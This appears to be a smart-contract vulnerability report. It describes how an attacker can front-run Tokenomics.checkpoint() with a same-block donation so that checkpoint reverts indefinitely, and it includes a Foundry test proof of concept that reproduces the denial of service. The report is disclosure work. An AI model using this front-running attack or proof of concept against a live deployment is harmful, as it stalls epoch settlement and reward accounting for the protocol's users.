  "body": "### Summary\nEvery successful service donation updates `lastDonationBlockNumber = block.number`.\n`Tokenomics.checkpoint()` unconditionally reverts if called in the same block as the most recent donation.\nAn attacker can watch the mempool for `checkpoint()` attempts and submit a donation in the same block (front-run/race), causing checkpoint to revert every time. This can delay epoch finalization indefinitely.\n## Root cause\nA global “no donations this block” latch is enforced via revert:\n```solidity\n// Check the last donation block number to avoid the possibility of a flash loan attack\nif (lastDonationBlockNumber == block.number) {\n    revert SameBlockNumberViolation();\n}\n```\nAnd donations always set it:\n```solidity\n// Set the current block number\nlastDonationBlockNumber = uint32(block.number);\n```\n## Impact\n- Epoch settlement liveness failure: `checkpoint()` can be delayed arbitrarily long.\n- Cascading delays:\n  - reward/top-up accounting finalization,\n  - staking incentive pot updates,\n  - any automation depending on timely epoch progression.\n## Attack scenario\n1) Keeper submits `checkpoint()` when epoch window is open.\n2) Attacker submits a donation tx with higher priority.\n3) Donation mined first → sets `lastDonationBlockNumber`.\n4) `checkpoint()` mined in same block → reverts `SameBlockNumberViolation()`.\n5) Attacker repeats indefinitely.",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\n\nimport {Tokenomics, SameBlockNumberViolation} from \"../contracts/Tokenomics.sol\";\nimport {TokenomicsProxy} from \"../contracts/proxies/TokenomicsProxy.sol\";\n\nimport {Treasury} from \"../contracts/Treasury.sol\";\n\nimport {ERC20Token} from \"../contracts/test/ERC20Token.sol\";\n\n/// @dev Minimal IVotes-like contract used by Tokenomics for `getVotes()`.\n/// @notice This is a small harness: Tokenomics depends on a ve-style voting escrow interface, but the full\n///         `veOLAS` implementation lives in a different subproject and cannot be imported into this Foundry suite\n///         without additional allow-paths. We avoid `vm.mockCall` and instead provide an on-chain implementation.\ncontract VotingEscrowHarness {\n    function getVotes(address) external pure returns (uint256) {\n        // Tokenomics default veOLASThreshold is 10_000e18.\n        return 10_000e18;\n    }\n}\n\n/// @dev Minimal ERC721 owner harness for component/agent registries.\ncontract UnitRegistryHarness {\n    address internal immutable _owner;\n\n    constructor(address owner_) {\n        _owner = owner_;\n    }\n\n    function ownerOf(uint256) external view returns (address) {\n        return _owner;\n    }\n\n    function totalSupply() external pure returns (uint256) {\n        return 1;\n    }\n}\n\n/// @dev Minimal ServiceRegistry harness for donation attribution.\ncontract ServiceRegistryHarness {\n    enum UnitType {\n        Component,\n        Agent\n    }\n\n    address internal immutable _serviceOwner;\n\n    constructor(address serviceOwner_) {\n        _serviceOwner = serviceOwner_;\n    }\n\n    function exists(uint256 serviceId) external pure returns (bool) {\n        return serviceId == 1;\n    }\n\n    function ownerOf(uint256) external view returns (address) {\n        return _serviceOwner;\n    }\n\n    function getUnitIdsOfService(UnitType, uint256) external pure returns (uint256 numUnitIds, uint32[] memory unitIds) {\n        // Return a single unit id so Tokenomics does not revert with ServiceNeverDeployed.\n        numUnitIds = 1;\n        unitIds = new uint32[](1);\n        unitIds[0] = 1;\n    }\n}\n\ncontract PoC_Tokenomics_SameBlockDonationCheckpoint is Test {\n    function test_PoC_Tokenomics_SameBlockDonation_CanDoS_Checkpoint() public {\n        // This PoC demonstrates the full on-chain attack path:\n        // attacker -> Treasury.depositServiceDonationsETH() -> Tokenomics.trackServiceDonations()\n        // then keeper -> Tokenomics.checkpoint() reverts in the same block with SameBlockNumberViolation().\n\n        // Make block/time deterministic.\n        vm.roll(100);\n        vm.warp(1_700_000_000);\n\n        address serviceOwner = address(0xA11CE);\n        address attacker = address(0xBEEF);\n\n        // --- Deploy harness dependencies required by Tokenomics.trackServiceDonations ---\n        VotingEscrowHarness ve = new VotingEscrowHarness();\n        UnitRegistryHarness componentRegistry = new UnitRegistryHarness(address(0xC0c0));\n        UnitRegistryHarness agentRegistry = new UnitRegistryHarness(address(0xA6e7));\n        ServiceRegistryHarness serviceRegistry = new ServiceRegistryHarness(serviceOwner);\n\n        // --- Deploy Tokenomics behind proxy and a real Treasury ---\n        ERC20Token olas = new ERC20Token();\n        Tokenomics impl = new Tokenomics();\n        uint256 epochLen = 10 days; // TokenomicsConstants.MIN_EPOCH_LENGTH\n\n        // Initialize Tokenomics with a placeholder treasury (will be updated after Treasury deployment).\n        bytes memory initData = abi.encodeCall(\n            Tokenomics.initializeTokenomics,\n            (\n                address(olas),\n                address(0x0000000000000000000000000000000000009999), // treasury placeholder\n                address(0x0000000000000000000000000000000000008888), // depository (unused in this PoC)\n                address(0x0000000000000000000000000000000000007777), // dispenser (unused in this PoC)\n                address(ve),\n                epochLen,\n                address(componentRegistry),\n                address(agentRegistry),\n                address(serviceRegistry),\n                address(0) // donatorBlacklist disabled\n            )\n        );\n        TokenomicsProxy proxy = new TokenomicsProxy(address(impl), initData);\n        Tokenomics tokenomics = Tokenomics(address(proxy));\n\n        // Deploy Treasury wired to Tokenomics.\n        Treasury treasury = new Treasury(address(olas), address(tokenomics), address(0x1), address(0x2));\n\n        // Update Tokenomics to use the real Treasury (owner is this test contract).\n        tokenomics.changeManagers(address(treasury), address(0), address(0));\n\n        // Warp into a time where checkpoint() would otherwise be eligible (diff >= epochLen).\n        vm.warp(block.timestamp + epochLen + 1);\n\n        // --- Attack path: donate in same block as checkpoint attempt ---\n        uint256 serviceId = 1;\n        uint256[] memory serviceIds = new uint256[](1);\n        serviceIds[0] = serviceId;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1 ether;\n\n        vm.deal(attacker, 10 ether);\n        vm.prank(attacker);\n        treasury.depositServiceDonationsETH{value: 1 ether}(serviceIds, amounts);\n\n        assertEq(uint256(tokenomics.lastDonationBlockNumber()), block.number);\n\n        // Keeper attempts checkpoint in the same block -> reverts.\n        vm.expectRevert(SameBlockNumberViolation.selector);\n        tokenomics.checkpoint();\n\n        // Next block, checkpoint proceeds.\n        vm.roll(block.number + 1);\n        bool success = tokenomics.checkpoint();\n        assertTrue(success);\n    }\n}\n```",
